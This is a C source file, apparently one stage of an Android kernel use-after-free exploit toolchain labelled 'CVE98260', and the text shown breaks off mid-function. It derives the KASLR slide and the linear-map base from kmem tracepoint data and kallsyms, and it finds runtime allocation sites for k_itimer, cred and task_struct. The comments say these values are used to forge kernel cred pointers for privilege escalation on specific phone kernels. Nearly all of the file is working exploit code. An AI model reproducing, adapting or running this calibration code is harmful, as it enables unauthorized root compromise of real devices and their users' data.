/*
 * calib.c - C rewrite of calib_a / calib_b
 *
 * Replaces the shell + python combo in the PC reference implementation:
 *   calib_a: capture_site.sh -> slide_from_timers.py
 *   calib_b: calib.sh -> solve_lmap.py
 *
 * Why calibration is required:
 *   The KASLR slide changes every boot; all kernel addresses in uaf_plant.c are derived from
 *   slide_addr(link) = link + g_slide; when g_slide stays 0, the computed
 *   addresses are all wrong and the UAF layout is guaranteed to fail. page_offset (linear map base) is used for
 *   object_pfn() to convert k_itimer virtual addresses into PFNs, which also must be measured each boot.
 *
 * calib_a principle (6.18 适配后):
 *   timer_probe creates a batch of CLOCK_THREAD_CPUTIME_ID timers,
 *   do_timer_create() allocates k_itimer from posix_timers_cache.
 *   In kmem_cache_alloc tracepoint records, bytes_req == bytes_alloc ==
 *   sizeof(struct k_itimer) —— 这个大小是 **随内核版本变的**（6.6=0x108/264，
 *   6.18=0x180/384），必须从 profile（BTF 推导）里取，不能写死。
 *
 *   新解法（首选）：文本 trace 里同一条记录还带 call_site= 与 func=：
 *       call_site=0xffffffc082211060 func=do_timer_create ptr=... req=384
 *   call_site 是 _RET_IP_，func 是内核符号化出来的函数名；而该函数的
 *   **未重定位**地址 F 我们从 kallsyms 里就有。于是
 *       call_site = F + slide + off,   slide ≡ 0 (mod 2MiB)
 *   => off = (call_site - F) mod 2MiB 唯一确定（函数长度 < 2MiB）
 *   => slide = call_site - F - off
 *   这样完全不需要写死 do_timer_create+0xa8 这种内核内锚点
 *   （6.18 开 LTO 后该偏移已经漂移，用它算出的 slide 会带固定偏差，
 *     并传染到 root_user/init_user_ns 等伪造 cred 的内核指针上）。
 *   顺带把各分配点的运行期 call_site 落到 sites.*，供 exploit 阶段做匹配键。
 *
 *   旧解法（兜底）：取出现频次最高的 call site，减去写死的 TIMER_LINK。
 *
 * calib_b principle:
 *   Within the same window, sample the mm_page_alloc(order=1) PFN set simultaneously (from text trace)
 *   and the k_itimer virtual address set (from raw trace, filtered by call site).
 *   Scan candidate linear map bases L; the correct L makes the PFNs derived from k_itimer's slab pages
 *   hit the order-1 allocation set heavily.
 */

#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernel_table.h"
#include "calib.h"
#include "slide_resolve.h"

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"

/* default candidate k_itimer sizes (PKJ110 6.6.118 and common 6.12.x variants) */
static const uint64_t KITIMER_SIZE_DEFAULTS[] = {0x108, 0x100, 0x110, 0x118};

/* task_struct 的 slab object_size 可能比 BTF 的 sizeof(struct task_struct) 大：
 * CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌进 task_struct（真机 6.18 实测
 * 4736 + 1024 = 5760），厂商还可能再追加。所以尺寸搜索按一段区间走。 */
#define TASK_SIZE_EXTRA_MAX 0x400U

/* Scan range of solve_lmap.py: PKJ110 DRAM starts at 0x80000000,
 * linear map base = PAGE_OFFSET - 0x80000000, must scan below 0xFFFFFF8000000000 */
#define SCAN_START UINT64_C(0xFFFFFF7E00000000)
#define LMAP_END   UINT64_C(0xFFFFFF8C00000000)
#define SCAN_STEP  UINT64_C(0x200000)

/* per-capture cap to avoid exhausting device memory */
#define PER_CPU_CAP   (16u * 1024u * 1024u)
#define TOTAL_CAP     (64u * 1024u * 1024u)

#define MAX_CPU_RAW 16

int timer_probe_main(int argc, char **argv);

/* ------------------------------------------------------------------ small utilities */

static const char *calib_home(void)
{
	const char *h = getenv("CVE98260_HOME");
	if (h && *h)
		return h;
	return "/data/local/tmp/cve98260-app";
}

static int write_file(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;
	size_t len;
	if (fd < 0)
		return -1;
	len = strlen(text);
	n = write(fd, text, len);
	close(fd);
	return n == (ssize_t)len ? 0 : -1;
}

static int truncate_file(const char *path)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | O_TRUNC);
	if (fd < 0)
		return -1;
	close(fd);
	return 0;
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

/*
 * Trigger one rss_stat so the enable_event trigger attached to it takes effect.
 * Consistent with capture_site.sh / calib.sh: rss_stat stays enabled across the whole capture window,
 * and is disabled by calib_disarm() after capture (uaf_plant.c's kick_rss disables it right after kicking).
 */
static void kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
}

static void set_buffer_kb(const char *value)
{
	if (write_file(TRACE "/buffer_size_kb", value))
		fprintf(stdout, "[config] warn: buffer_size_kb=%s not writable, continue\n", value);
}

/*
 * Arm a kmem event deterministically.
 *
 * The reference implementation arms events *indirectly*: it attaches
 * "enable_event:kmem:<name>" to the kmem/rss_stat trigger and then kicks
 * rss_stat by touching a single anonymous page (kick_rss). Whether that arms
 * anything depends on the per-task RSS counter crossing TASK_RSS_EVENTS_THRESH
 * at that instant -- one 4KiB touch only advances the counter by 1, so it is
 * essentially a coin flip on kernels whose counter was just flushed.
 *
 * calib_a/calib_b usually get away with it because rss_stat stays enabled
 * across the whole timer probe (thousands of further RSS bumps), but the
 * short-lived captures in uaf_plant.c (leak_task / leak_cred) get exactly one
 * kick and no further RSS growth, so they end up with zero records. Observed
 * reproducibly on Xiaomi 6.6.118-android15-8-g0908354dac1b:
 *     [task] hits=0 foreign=0 task=0  ->  [task] leak failed
 *
 * Prefer the direct write to events/kmem/<name>/enable; keep the trigger only
 * as a fallback for ROMs that refuse the direct write.
 */
static int arm_kmem_event(const char *name)
{
	char path[192];

	snprintf(path, sizeof(path), TRACE "/events/kmem/%s/enable", name);
	if (!write_file(path, "1\n")) {
		fprintf(stdout, "[config] armed %s directly\n", name);
		return 0;
	}
	snprintf(path, sizeof(path), "enable_event:kmem:%s\n", name);
	if (!trigger_cmd(path))
		return 0;
	return -1;
}

static void calib_disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
	write_file(TRACE "/events/kmem/mm_page_alloc/enable", "0\n");
	write_file(TRACE "/events/kmem/mm_page_free/enable", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
}

static uint64_t now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
}

static int write_result_file(const char *name, const char *value)
{
	char path[512];
	FILE *f;
	snprintf(path, sizeof(path), "%s/%s", calib_home(), name);
	f = fopen(path, "w");
	if (!f) {
		fprintf(stderr, "[config] error: cannot write %s\n", path);
		return -1;
	}
	fprintf(f, "%s\n", value);
	fclose(f);
	chmod(path, 0664);
	return 0;
}

/* -------------------------------------------------- raw trace capture (equivalent to: timeout N dd) */

struct raw_sink {
	size_t len;
	size_t alloc;
	size_t cap;
	uint8_t *buf;
};

/*
 * E2：分配失败返回 -1。
 *
 * 原实现只赋值不检查，两个调用点各自补了一个 `if (!sink.buf)` 兜底——能工作，
 * 但把「必须判空」的约定藏在了调用方。这里把契约显式化（返回码），两个调用点
 * 改为检查返回值，避免以后新增调用点忘记判空。
 */
static int sink_init(struct raw_sink *s, size_t cap)
{
	s->len = 0;
	s->alloc = 1u << 20;
	s->cap = cap;
	s->buf = malloc(s->alloc);
	return s->buf ? 0 : -1;
}

static int sink_reserve(struct raw_sink *s, size_t need)
{
	if (s->len + need <= s->alloc)
		return 0;
	if (s->len >= s->cap)
		return -1;
	while (s->alloc < s->len + need)
		s->alloc *= 2;
	if (s->alloc > s->cap)
		s->alloc = s->cap;
	{
		uint8_t *p = realloc(s->buf, s->alloc);
		if (!p)
			return -1;
		s->buf = p;
	}
	return 0;
}

/* child process: blocking-read the raw pipe and write to pipe (equiv: dd if=... bs=65536) */
static void capture_child(const char *path, int wfd)
{
	int in = open(path, O_RDONLY);
	char buf[65536];
	if (in < 0)
		_exit(1);
	for (;;) {
		ssize_t n = read(in, buf, sizeof(buf));
		if (n < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		if (n == 0)
			break;
		if (write(wfd, buf, (size_t)n) != n)
			break;
	}
	close(in);
	_exit(0);
}

/*
 * 空闲早停窗口（毫秒）。
 *
 * trace_pipe_raw 是**活管道**：per-CPU 环形缓冲排空后不会 EOF，fd 一直挂着，
 * 所以旧实现只能靠 seconds 硬超时收尾 —— 实测每次都白等满 8 秒。
 * 真机 2026-10-31 的日志里，「text trace: 64 k_itimer site(s) captured」
 * 到「captured raw=14032896 bytes」之间整整隔了 7 秒，那 7 秒全在空转。
 *
 * 400ms 是保守值：采集前 tracing_on 已关，缓冲里的数据是冻结的，
 * 排空即结束；宁可多等 400ms，也不要少读一条记录。
 */
#define RAW_IDLE_MS 400

/* parent: collect with timeout, SIGKILL the child on timeout (equiv: timeout N dd ... &)
 *
 * idle_ms > 0 时启用**空闲早停**：连续 idle_ms 没有新数据就认为读完了。
 * 一条都没读到时仍按老行为等到硬超时 —— 避免把「没抓到」误判成「抓完了」。
 */
/*
 * 崩溃前的最后一步必须已经在盘上。
 *
 * calib.c 全篇用 fprintf(stdout, ...) 输出。stdout 重定向到文件时是**全缓冲**
 * 的（默认 4 KB 一块），进程被 kernel panic 带走时缓冲区内容会一起丢 ——
 * 表现就是「跑一次设备重启，日志什么都没有」。校准阶段恰恰是最容易崩的地方
 * （要往内核地址写东西），所以这里在关键节点强制 flush + fdatasync。
 */
static void calib_sync(void)
{
	fflush(stdout);
	fdatasync(STDOUT_FILENO);
}

static void capture_raw(struct raw_sink *sink, const char *const *paths,
			int npaths, int seconds, int idle_ms, const char *label)
{
	int fds[MAX_CPU_RAW];
	pid_t pids[MAX_CPU_RAW];
	struct pollfd pfds[MAX_CPU_RAW];
	int n = 0;
	uint64_t deadline;
	uint64_t last_ms;
	uint64_t started_ms;
	int i;

	if (!sink->buf)
		return;
	started_ms = now_ms();
	deadline = started_ms + (uint64_t)seconds * 1000u;
	last_ms = started_ms;

	for (i = 0; i < npaths && n < MAX_CPU_RAW; i++) {
		int pipe_fd[2];
		pid_t pid;
		if (access(paths[i], R_OK) != 0)
			continue;
		if (pipe(pipe_fd))
			continue;
		pid = fork();
		if (pid == 0) {
			close(pipe_fd[0]);
			capture_child(paths[i], pipe_fd[1]);
			_exit(1);
		}
		close(pipe_fd[1]);
		if (pid < 0) {
			close(pipe_fd[0]);
			continue;
		}
		fds[n] = pipe_fd[0];
		pids[n] = pid;
		n++;
	}
	if (n == 0) {
		fprintf(stderr, "[config] warn: no usable trace_pipe_raw\n");
		return;
	}

	while (now_ms() < deadline && sink->len < sink->cap) {
		uint64_t remain = deadline - now_ms();
		int wait_ms = remain > 200u ? 200 : (int)remain;
		int ready;

		/*
		 * 空闲早停：连续 idle_ms 没有新数据 → 环形缓冲已排空。
		 * 只有读到过数据才允许早停（一条都没读到时仍等硬超时，
		 * 避免把「没抓到」误判成「抓完了」）。
		 */
		if (idle_ms > 0 && sink->len > 0 &&
		    now_ms() - last_ms >= (uint64_t)idle_ms)
			break;

		for (i = 0; i < n; i++) {
			pfds[i].fd = fds[i];
			pfds[i].events = POLLIN;
			pfds[i].revents = 0;
		}
		ready = poll(pfds, (nfds_t)n, wait_ms);
		if (ready < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		if (ready == 0)
			continue;
		for (i = 0; i < n; i++) {
			ssize_t got;
			if (fds[i] < 0 || !(pfds[i].revents & POLLIN))
				continue;
			if (sink_reserve(sink, 65536))
				break;
			got = read(fds[i], sink->buf + sink->len, sink->alloc - sink->len);
			if (got < 0) {
				if (errno == EINTR || errno == EAGAIN)
					continue;
				close(fds[i]);
				fds[i] = -1;
				continue;
			}
			if (got == 0) {
				close(fds[i]);
				fds[i] = -1;
				continue;
			}
			sink->len += (size_t)got;
			last_ms = now_ms();
		}
	}

	fprintf(stdout, "[%s] raw capture: %zu bytes in %llu ms (idle window %d ms)\n",
		label ? label : "calib", sink->len,
		(unsigned long long)(now_ms() - started_ms), idle_ms);
	calib_sync();

	for (i = 0; i < n; i++) {
		int st;
		if (fds[i] >= 0)
			close(fds[i]);
		kill(pids[i], SIGKILL);
		while (waitpid(pids[i], &st, 0) < 0 && errno == EINTR) {
		}
	}
}

/* The pure-compute parts of record scanning and lmap solving live in calib_core.c (host unit-testable) */

/* local u64 comparator (pure-compute version in calib_core.c) */
static int cmp_u64_local(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}


/* ------------------------------------------------------------------ *
 * 6.18 适配：kallsyms 精确解 slide
 * ------------------------------------------------------------------ */

/* kallsyms 文本（未重定位 VA）。由 APK 侧导入 boot.img 时导出，
 * 形如 "0xffffffc08021104c do_timer_create"，按 VA 升序。
 * 文件放在 $CVE98260_HOME/kallsyms.txt。 */
static char *g_kallsyms_buf;

/* sr_find_func() 是二分查找，要求符号表按 VA 升序；这里统一排一次。 */
static int cmp_sr_sym_va(const void *a, const void *b)
{
	const sr_sym *x = a, *y = b;

	if (x->va != y->va)
		return (x->va < y->va) ? -1 : 1;
	return strcmp(x->name ? x->name : "", y->name ? y->name : "");
}

static int load_kallsyms_map(sr_sym **out_syms, size_t *out_n)
{
	char path[512];
	FILE *f;
	long len;
	sr_sym *arr = NULL;
	size_t n = 0, cap = 0;
	char *p;

	*out_syms = NULL;
	*out_n = 0;

	snprintf(path, sizeof(path), "%s/kallsyms.txt", calib_home());
	f = fopen(path, "rb");
	if (!f) {
		fprintf(stderr, "[calib_a] kallsyms map not found: %s\n", path);
		return -1;
	}
	fseek(f, 0, SEEK_END);
	len = ftell(f);
	fseek(f, 0, SEEK_SET);
	if (len <= 0 || len > (64L << 20)) {
		fclose(f);
		return -1;
	}
	g_kallsyms_buf = (char *)malloc((size_t)len + 1);
	if (!g_kallsyms_buf) {
		fclose(f);
		return -1;
	}
	if (fread(g_kallsyms_buf, 1, (size_t)len, f) != (size_t)len) {
		free(g_kallsyms_buf);
		g_kallsyms_buf = NULL;
		fclose(f);
		return -1;
	}
	g_kallsyms_buf[len] = 0;
	fclose(f);

	p = g_kallsyms_buf;
	while (*p) {
		char *nl = strchr(p, '\n');
		unsigned long long va;
		char name[256];
		char *nstart;

		if (nl)
			*nl = 0;
		if (sscanf(p, "%llx %255s", &va, name) == 2) {
			/*
			 * name 指针必须指向行内的**符号名**，不能是行首：
			 * 行首是 VA（"0xffffffc08021104c do_timer_create"），
			 * 早先写成 p + strspn(p, " \t") 时 strspn 匹配 0 个字符，
			 * 于是 name 变成整行文本 —— 按名字查表的 kallsyms_lookup_name()
			 * 因此从未匹配成功，文本 trace 那条交叉验证路径整条是死的。
			 */
			nstart = p;
			while (*nstart && *nstart != ' ' && *nstart != '\t')
				nstart++;
			nstart += strspn(nstart, " \t");
			if (n == cap) {
				size_t ncap = cap ? cap * 2 : 8192;
				sr_sym *na = (sr_sym *)realloc(arr, ncap * sizeof(sr_sym));
				if (!na)
					break;
				arr = na;
				cap = ncap;
			}
			arr[n].va = (uint64_t)va;
			arr[n].name = nstart;   /* 指向 g_kallsyms_buf，不拷贝 */
			n++;
		}
		if (!nl)
			break;
		p = nl + 1;
	}

	/*
	 * 按 VA 升序排序后再去重：
	 *   · sr_find_func() 是二分查找，要求表按 VA 升序；
	 *   · 同一 VA 常有多个别名（_text/__pi__text…），只保留第一个，
	 *     否则「下一个符号」会算出 0 长度的函数。
	 */
	if (n > 1)
		qsort(arr, n, sizeof(sr_sym), cmp_sr_sym_va);
	{
		size_t w = 0;

		for (size_t i = 0; i < n; i++) {
			if (w && arr[w - 1].va == arr[i].va)
				continue;
			arr[w++] = arr[i];
		}
		n = w;
	}
	if (!n) {
		free(arr);
		return -1;
	}
	*out_syms = arr;
	*out_n = n;
	return 0;
}

/* kallsyms 里按符号名精确查表（kallsyms.txt 的符号名没有类型前缀）。
 * 返回 1 命中，0 未命中。 */
static int kallsyms_lookup_name(const sr_sym *syms, size_t n, const char *name,
				 uint64_t *out_va)
{
	size_t i;

	if (!name || !*name)
		return 0;
	for (i = 0; i < n; i++) {
		if (syms[i].name && !strcmp(syms[i].name, name)) {
			if (out_va)
				*out_va = syms[i].va;
			return 1;
		}
	}
	return 0;
}

/*
 * 同 kallsyms_lookup_name()，但额外给出命中条目在表里的下标。
 * 调用方要拿符号名时必须用这个：syms[idx].name 指向 kallsyms 缓冲，
 * 进程生命周期内有效；临时缓冲里的副本在函数返回后就是悬垂指针。
 */
static int kallsyms_find_name(const sr_sym *syms, size_t n, const char *name,
			       size_t *out_idx, uint64_t *out_va)
{
	size_t i;

	if (!name || !*name)
		return 0;
	for (i = 0; i < n; i++) {
		if (syms[i].name && !strcmp(syms[i].name, name)) {
			if (out_idx)
				*out_idx = i;
			if (out_va)
				*out_va = syms[i].va;
			return 1;
		}
	}
	return 0;
}

/*
 * 文本 trace 里的一条 kmem_cache_alloc 记录（已解析）。
 *
 * 真机 6.18 的格式：
 *   call_site=dup_task_struct+0x54/0x498 ptr=... name=task_struct
 *   bytes_req=5760 bytes_alloc=5760 gfp_flags=GFP_KERNEL node=-1 accounted=true
 */
#define TEXT_SITE_MAX 64

struct text_site {
	char     sym[64];   /* call_site= 的符号名（%pS 形式解析，或 6.6 的 func=） */
	uint64_t off;       /* call_site= 的函数内偏移（仅 %pS 形式有意义） */
	uint64_t req;       /* bytes_req = s->object_size */
	char     cache[48]; /* slab cache 名（6.18 才有 name= 字段） */
	uint64_t addr;      /* 非 0 = call_site 是**数值运行期地址**（6.6 形式） */
};

/*
 * 扫文本 trace 里所有 bytes_req == want_req 的 kmem_cache_alloc 记录，
 * 用每条记录的「符号名 + 函数内偏移」反推 slide，返回**第一个自洽**的候选。
 *
 * 6.18 的真实格式（真机实测 madrid / 6.18.21-android17）：
 *   kmem_cache_alloc: call_site=do_timer_create+0xe8/0x508 ptr=00000000411047a6
 *       name=posix_timers_cache bytes_req=384 bytes_alloc=384
 *       gfp_flags=GFP_KERNEL|__GFP_ZERO node=-1 accounted=true
 *
 * 两个必须注意的点：
 *   1. %pS 打印的是「符号名+0x函数内偏移/0x函数大小」，**没有数值地址**，
 *      也没有 func= 字段 —— 数值 call_site 只能从 raw trace 取。
 *   2. 真机实测 6.18 的调用点是 do_timer_create+0xe8，而 6.6 profile 写死的是
 *      +0xa8，正好差 0x40 —— 这就是旧锚点在 6.18 上失效的原因。
 *
 * 自洽判据：slide ≡ 0 (mod 2 MiB) 且 0 <= slide < 2^42。
 * 一个随机记录偶然满足的概率是 1/2 MiB，可以当噪声过滤用。
 *
 * ts / nts 是**探针结束后立刻**从文本 trace 采集的候选（见
 * text_trace_collect_sites）：文本 buffer 是环形缓冲，等 raw 捕获跑完
 * 再读，探针窗口的记录早就被系统级分配流量冲掉了。
 */
static int text_trace_slide_candidate(const sr_sym *syms, size_t n,
				       const struct text_site *ts, int nts,
				       uint64_t site,
				       char *sym_out, size_t sym_cap,
				       uint64_t *off_out, uint64_t *out_slide)
{
	size_t i;

	if (!ts || nts <= 0)
		return -1;
	for (i = 0; i < (size_t)nts; i++) {
		uint64_t off = ts[i].off, tva = 0, slide;
		char sym[96];

		/* 6.6 的数值形式给不出「符号 + 精确偏移」，用不了这条无假设的
		 * 解法（offset 未知），留给 2 MiB 对齐法处理。 */
		if (ts[i].addr)
			continue;
		snprintf(sym, sizeof(sym), "%s", ts[i].sym);
		if (!kallsyms_lookup_name(syms, n, sym, &tva))
			continue;
		if (site < tva + off)
			continue;
		slide = site - tva - off;
		if ((slide % SR_SLIDE_ALIGN) || slide >= SR_SLIDE_MAX)
			continue;
		snprintf(sym_out, sym_cap, "%s", sym);
		*off_out = off;
		*out_slide = slide;
		return 0;
	}
	if (getenv("CVE98260_DEBUG_TEXT")) {
		for (i = 0; i < (size_t)nts && i < 3u; i++) {
			uint64_t tva = 0, slide = 0;

			if (kallsyms_lookup_name(syms, n, ts[i].sym, &tva))
				slide = site - tva - ts[i].off;
			fprintf(stderr, "[calib_a] slide try: sym=%s tva=%#llx off=%#llx site=%#llx -> slide=%#llx align_ok=%d\n",
				ts[i].sym, (unsigned long long)tva,
				(unsigned long long)ts[i].off, (unsigned long long)site,
				(unsigned long long)slide,
				(slide % SR_SLIDE_ALIGN) ? 0 : 1);
		}
	}
	return -1;
}

/* ------------------------------------------------------------------ *
 * cred / task 分配点的运行期解析
 * ------------------------------------------------------------------ */

/* 函数名是否命中任一语义关键字 */
static int name_has_any(const char *name, const char *const *keys, size_t n_keys)
{
	size_t i;

	if (!name)
		return 0;
	for (i = 0; i < n_keys; i++)
		if (keys[i] && strstr(name, keys[i]))
			return 1;
	return 0;
}

/* ------------------------------------------------------------------ *
 * 文本 trace 采集
 * ------------------------------------------------------------------ */

/*
 * 从文本 trace 里收集 kmem_cache_alloc 记录。
 *
 * filter_name 非空时按 cache 名精确匹配；want_req 非 0 时按 bytes_req 匹配。
 * 两者都给 0 表示不过滤（收集前 N 条）。
 *
 * 必须**紧接着探针**调用：文本 buffer 是按 CPU 分的环形缓冲，系统级
 * kmem_cache_alloc 流量很大，几秒就能把探针窗口的记录冲掉 —— 这正是
 * 之前「文本 trace 交叉验证在真机从未触发」的原因（读的时候已经晚了）。
 */
static int text_trace_collect_sites(const char *filter_name, uint64_t want_req,
				    struct text_site *out, int cap)
{
	FILE *f;
	char line[1024];
	int n = 0;

	if (!out || cap <= 0)
		return 0;
	f = fopen(TRACE "/trace", "r");
	if (!f)
		return 0;
	while (n < cap && fgets(line, sizeof(line), f)) {
		char *p, *e;
		unsigned long long req = 0;
		struct text_site ts;

		if (!strstr(line, "kmem_cache_alloc:"))
			continue;

		memset(&ts, 0, sizeof(ts));

		/* name= */
		p = strstr(line, "name=");
		if (p) {
			p += 5;
			e = p;
			while (*e && *e != ' ' && *e != '\n')
				e++;
			if ((size_t)(e - p) < sizeof(ts.cache)) {
				memcpy(ts.cache, p, (size_t)(e - p));
				ts.cache[e - p] = 0;
			}
		}
		/* 尺寸：6.18 是 bytes_req=，6.6 是 req= */
		p = strstr(line, "bytes_req=");
		if (!p)
			p = strstr(line, "req=");
		if (p)
			sscanf(p, "bytes_req=%llu", &req) ||
				sscanf(p, "req=%llu", &req);
		ts.req = (uint64_t)req;

		if (filter_name && *filter_name &&
		    (strcmp(ts.cache, filter_name) != 0))
			continue;
		if (want_req && ts.req != want_req)
			continue;

		/* call_site：6.18 是 %pS 的 "FUNC+0xOFF/LEN"；6.6 是数值地址 + func= */
		p = strstr(line, "call_site=");
		if (!p)
			continue;
		p += 10;
		e = p;
		while (*e && *e != ' ' && *e != '\n')
			e++;
		{
			char raw[sizeof(ts.sym) + 32];
			size_t len = (size_t)(e - p);

			if (len == 0 || len >= sizeof(raw))
				continue;
			memcpy(raw, p, len);
			raw[len] = 0;
			if (calib_parse_psym(raw, ts.sym, sizeof(ts.sym), &ts.off)) {
				ts.addr = 0;
			} else if (raw[0] == '0' && (raw[1] == 'x' || raw[1] == 'X')) {
				/* 6.6 形式：call_site=0x<运行期地址> func=<符号名> */
				ts.addr = strtoull(raw, NULL, 0);
				p = strstr(line, "func=");
				if (p) {
					p += 5;
					e = p;
					while (*e && *e != ' ' && *e != '\n')
						e++;
					if ((size_t)(e - p) < sizeof(ts.sym)) {
						memcpy(ts.sym, p, (size_t)(e - p));
						ts.sym[e - p] = 0;
					} else {
						ts.sym[0] = 0;
					}
				} else {
					ts.sym[0] = 0;
				}
			} else {
				continue;
			}
		}

		out[n++] = ts;
		if (n == 1 && getenv("CVE98260_DEBUG_TEXT")) {
			fprintf(stderr, "[calib_a] raw text line: %s", line);
		}
	}
	fclose(f);
	return n;
}

/*
 * 从文本 trace 里解析某个 slab cache 的运行期分配点。
 *
 * 文本 trace 比 raw trace 多给三样东西，正好补上 raw 的短板：
 *   name=<cache>         —— cache 名（cred / task_struct），**不用猜尺寸**；
 *   bytes_req=<n>        —— 该 cache 的 object_size
 *                           （6.18: bytes_req = s->object_size，bytes_alloc = s->size）；
 *   call_site=FUNC+0xOFF —— 符号名 + 函数内偏移。
 *
 * 于是运行期调用点可以直接算出来，不需要 raw trace：
 *     runtime_site = kallsyms_va(FUNC) + slide + OFF
 *
 * 为什么 cred 的尺寸能对上、task_struct 对不上（真机 6.18 实测）：
 *   cred        cache object_size = sizeof(struct cred) = 184  ← 与 BTF 一致
 *   task_struct cache object_size = sizeof(struct task_struct) + THREAD_SIZE
 *               （CONFIG_THREAD_SIZE_IN_TSK 把栈内嵌进 task_struct）
 *               实测 4736(BTF) + 1024(THREAD_SIZE) = 5760，而 profile 记的是 4736。
 * 所以 task_struct 的尺寸**只能运行期实测**，写死或从 BTF 推都会错。
 *
 * 返回 1 = 找到（*out_site 运行期 call_site，*out_size 该 cache 的 object_size）。
 */
static int resolve_alloc_site_by_name(const char *cache_name,
				      const char *const *func_keywords,
				      size_t n_func_keywords,
				      const sr_sym *syms, size_t n, uint64_t slide,
				      uint64_t *out_site, uint64_t *out_size,
				      char *out_func, size_t out_func_cap)
{
	struct text_site ts[TEXT_SITE_MAX];
	int nts, i;

	*out_site = 0;
	*out_size = 0;
	if (out_func && out_func_cap)
		out_func[0] = 0;

	nts = text_trace_collect_sites(cache_name, 0, ts, TEXT_SITE_MAX);
	for (i = 0; i < nts; i++) {
		uint64_t tva = 0, site;
		size_t idx = 0;
		char sym[96];

		snprintf(sym, sizeof(sym), "%s", ts[i].sym);
		if (ts[i].addr) {
			/* 6.6 形式：call_site 就是数值运行期地址，直接用 */
			site = ts[i].addr;
			if (!*sym)
				continue;
			if (!name_has_any(sym, func_keywords, n_func_keywords))
				continue;
			*out_site = site;
			*out_size = ts[i].req;
			if (out_func && out_func_cap)
				snprintf(out_func, out_func_cap, "%s", sym);
			return 1;
		}
		/* 符号名要能对上 kallsyms；LTO 可能带 .constprop.N 后缀 */
		if (!kallsyms_find_name(syms, n, sym, &idx, &tva)) {
			char *dot = strchr(sym, '.');

			if (!dot)
				continue;
			*dot = 0;
			if (!kallsyms_find_name(syms, n, sym, &idx, &tva))
				continue;
		}
		/* 函数名要命中语义关键字 */
		if (!name_has_any(sym, func_keywords, n_func_keywords))
			continue;

		site = tva + slide + ts[i].off;
		if ((site >> 48) != 0xFFFFULL)
			continue;
		*out_site = site;
		*out_size = ts[i].req;
		if (out_func && out_func_cap)
			snprintf(out_func, out_func_cap, "%s", syms[idx].name);
		return 1;
	}
	return 0;
}

/*
 * 在 raw trace 里解析某个 slab 尺寸的运行期分配点。
 *
 * 步骤：
 *   1. 用布局自适应扫描器取出该尺寸的全部记录
 *      （6.18 的 bytes_req = s->object_size，正好是 BTF 里的 sizeof）；
 *   2. 按 call_site 聚类，出现最多的几个成为候选；
 *   3. 每个候选用 slide 反算成未重定位地址，查 kallsyms 得到所属函数；
 *   4. calib_pick_trusted_site() 做语义自证（函数名关键字 / 与 profile 锚点同函数）。
 *
 * 这是 resolve_alloc_site_by_name() 的兜底：文本 trace 被冲刷掉时，
 * 仍能按「尺寸 + 调用点聚类 + 语义自证」把站点找回来。
 *
 * 返回 1 = 找到可信分配点（*out_site 为运行期 call_site，*out_func 为函数名）。
 */
static int resolve_alloc_site(const uint8_t *raw, size_t raw_len,
			      const sr_sym *syms, size_t n,
			      uint64_t slide, const uint64_t *sizes, size_t n_sizes,
			      const char *const *keywords, size_t n_keywords,
			      uint64_t anchor_link,
			      uint64_t *out_site, uint64_t *out_size,
			      char *out_func, size_t out_func_cap)
{
	struct calib_kmem_rec *recs = NULL;
	struct calib_site_cand cands[32];
	uint64_t *sites = NULL;
	struct calib_run top[32];
	size_t nrec = 0, n_top = 0, i, nc = 0;
	uint64_t anchor_base = 0, anchor_len = 0;
	int found = 0;

	*out_site = 0;
	*out_size = 0;
	if (out_func && out_func_cap)
		out_func[0] = 0;
	if (!raw || !raw_len || !sizes || !n_sizes)
		goto out;

	recs = calib_scan_kmem_recs(raw, raw_len, sizes, n_sizes, &nrec);
	if (!recs || !nrec)
		goto out;
	sites = malloc(nrec * sizeof(uint64_t));
	if (!sites)
		goto out;
	for (i = 0; i < nrec; i++)
		sites[i] = recs[i].site;
	n_top = calib_top_values(sites, nrec, top, 32);
	if (!n_top)
		goto out;

	/* profile 锚点（cred_link）所在的函数：允许 LTO 把 prepare_creds 内联走 */
	if (anchor_link &&
	    sr_find_func(syms, n, anchor_link, &anchor_base, &anchor_len, NULL) == 1) {
		/* anchor_base / anchor_len 就绪 */
	}

	for (i = 0; i < n_top && nc < 32; i++) {
		uint64_t site = top[i].value;
		uint64_t unreloc, fbase = 0, flen = 0;
		const char *fname = NULL;

		if (site < slide)
			continue;
		unreloc = site - slide;
		if (sr_find_func(syms, n, unreloc, &fbase, &flen, &fname) != 1)
			continue;
		cands[nc].site = site;
		cands[nc].count = top[i].count;
		cands[nc].func_base = fbase;
		cands[nc].func_len = flen;
		cands[nc].name_hit = name_has_any(fname, keywords, n_keywords);
		nc++;
	}
	if (!nc)
		goto out;

	if (calib_pick_trusted_site(cands, nc, slide, anchor_base, anchor_len,
				    out_site) == 1) {
		found = 1;
		for (i = 0; i < nrec; i++) {
